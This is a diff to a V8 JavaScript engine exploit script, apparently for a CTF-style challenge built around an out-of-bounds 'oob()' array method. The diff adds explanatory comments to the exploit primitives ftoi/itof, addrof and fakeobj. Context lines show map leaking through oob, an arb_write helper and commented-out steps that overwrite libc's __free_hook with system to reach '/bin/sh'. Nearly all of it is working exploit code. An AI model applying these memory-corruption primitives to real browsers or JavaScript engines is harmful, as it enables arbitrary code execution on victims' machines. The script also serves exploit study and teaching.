@@ -7,11 +7,23 @@ var buf = new ArrayBuffer(8); // 8 byte array buffer
 var f64_buf = new Float64Array(buf);
 var u64_buf = new Uint32Array(buf);
 
+/**
+ * Convert a float to an big integer
+ * The raw leak from the V8 usually is a float, so we need to convert it to an integer for better visibility
+ * @param {Float} val 
+ * @returns 
+ */
 function ftoi(val) { // typeof(val) = float
     f64_buf[0] = val;
     return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
 }
 
+/**
+ * Convert a big integer to a float
+ * Before writing to the V8, we need to convert the integer to a float
+ * @param {BigInt} val 
+ * @returns 
+ */
 function itof(val) { // typeof(val) = BigInt
     u64_buf[0] = Number(val & 0xffffffffn);
     u64_buf[1] = Number(val >> 32n);
@@ -24,6 +36,12 @@ var fl_arr = [1.1, 1.2, 1.3, 1.4];
 var map1 = obj_arr.oob();
 var map2 = fl_arr.oob();
 
+/**
+ * Get the address of an arbitrary JavaScript value except for Smis
+ * 
+ * @param {Object} in_obj 
+ * @returns 
+ */
 function addrof(in_obj) {
     // First, put the obj whose address we want to find into index 0
     obj_arr[0] = in_obj;
@@ -41,6 +59,12 @@ function addrof(in_obj) {
     return ftoi(addr);
 }
 
+/**
+ * Fake an reference to the address as an object
+ * It means that you can read/write the memory address like accessing an Object, e.g., using fake[0]/fake[0]=value.
+ * @param {BigInt} addr 
+ * @returns 
+ */
 function fakeobj(addr) {
     // First, put the address as a float into index 0 of the float array
     fl_arr[0] = itof(addr);
@@ -164,7 +188,7 @@ function arb_write(addr, val) {
 // let free_hook_addr = libc_base_addr + 0x3ed8e8n;
 // let system_addr = libc_base_addr + 0x4f420n;
 // arb_write(free_hook_addr, system_addr);
-// %SystemBreak();
+// // %SystemBreak();
 
 // console.log("/bin/sh");
 
